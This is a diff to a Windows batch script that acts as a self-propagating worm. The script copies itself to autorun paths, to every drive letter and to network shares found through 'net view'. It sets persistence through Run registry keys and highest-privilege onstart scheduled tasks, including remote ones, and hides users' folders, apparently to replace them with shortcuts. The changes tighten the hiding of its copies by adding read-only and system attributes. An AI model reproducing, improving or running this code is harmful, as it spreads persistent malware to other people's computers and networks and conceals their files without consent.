@@ -86,8 +86,8 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v
 :cycle
 copy /y "%~dpnx0" "%path_autoRun1%\"
 copy /y "%~dpnx0" "%path_autoRun2%\"
-attrib +s +h "%path_autoRun1%\%~nx0"
-attrib +s +h "%path_autoRun2%\%~nx0"
+attrib +h +r +s "%path_autoRun1%\%~nx0"
+attrib +h +r +s "%path_autoRun2%\%~nx0"
 
 
 for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
@@ -98,12 +98,13 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
       reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%~nx0" /f
       reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%~nx0" /f
       schtasks /create /sc onstart /tn "%app_name% %%i" /tr %%i:\%~nx0 /f /rl highest
-      attrib +s +h "%%i:\%~nx0"
+      attrib +h +r +s "%%i:\%~nx0"
 
       if /i "%%i:" NEQ "%systemDrive%" if /i "%%i:" NEQ "D:" (
         for /f "delims=" %%x in ('dir "%%i:\*" /a:d /b 2^>nul') do (
           if /i "%%x" NEQ "$RECYCLE.BIN" if /i "%%x" NEQ "FOUND.000" if /i "%%x" NEQ "Recycled" if /i "%%x" NEQ "System Volume Information" (
             attrib +h +s "%%i:\%%x"
+
             if not exist "%%i:\%%x.lnk" (
               set counter=0
               for /f "delims=" %%y in ('dir "%%i:\%%x\*" /b 2^>nul') do set /a counter+=1
@@ -117,7 +118,7 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
       )
     ) else (
       copy /y "%~dpnx0" %%i:\
-      attrib +s +h "%%i:\%~nx0"
+      attrib +h +r +s "%%i:\%~nx0"
     )
   )
 )
@@ -128,12 +129,13 @@ for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The"
   for /f "skip=7 tokens=1,* delims= " %%j in ('net view %%i') do if /i "%%j" NEQ "The" (
     if exist "%%i:\%~nx0" (
       for /f "delims=\" %%z in ("%%i") do schtasks /create /s %%z /sc onstart /tn "%app_name% %%j" /tr %%j:\%~nx0 /f /rl highest
-      attrib +s +h "%%i\%%j\%~nx0"
+      attrib +h +r +s "%%i\%%j\%~nx0"
 
       if /i "%%j:" NEQ "C:" (
         for /f "delims=" %%x in ('dir "%%i\%%j\*" /a:d /b 2^>nul') do (
           if /i "%%x" NEQ "$RECYCLE.BIN" if /i "%%x" NEQ "FOUND.000" if /i "%%x" NEQ "Recycled" if /i "%%x" NEQ "System Volume Information" (
             attrib +h +s "%%i\%%j\%%x"
+
             if not exist "%%i\%%j\%%x.lnk" (
               set counter=0
               for /f "delims=" %%y in ('dir "%%i\%%j\%%x\*" /b 2^>nul') do set /a counter+=1
@@ -147,7 +149,7 @@ for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The"
       )
     ) else (
       copy /y "%~dpnx0" "%%i\%%j\"
-      attrib +s +h "%%i\%%j\%~nx0"
+      attrib +h +r +s "%%i\%%j\%~nx0"
     )
   )
 )
